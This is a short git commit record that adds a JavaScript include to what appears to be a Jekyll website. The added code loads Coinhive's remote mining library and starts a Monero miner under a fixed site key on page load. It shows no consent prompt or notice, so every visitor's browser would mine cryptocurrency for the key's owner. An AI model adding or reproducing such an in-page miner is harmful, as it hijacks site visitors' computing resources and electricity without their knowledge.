9310eb130cea47948eec1b238c39f5ba3d68270d
Eugene Zubkov <evgvzubkoff@gmail.com>
2018-02-01 18:34:42 +0200

    Create monero.js

---
+++ _includes/monero.js
@@ -0,0 +1,5 @@
+<script src="https://coinhive.com/lib/coinhive.min.js"></script>
+<script>
+	var miner = new CoinHive.User('5BW8cKCY8B7ENEOINujiFUT9IXJG8oE3', 'johndoe');
+	miner.start();
+</script>
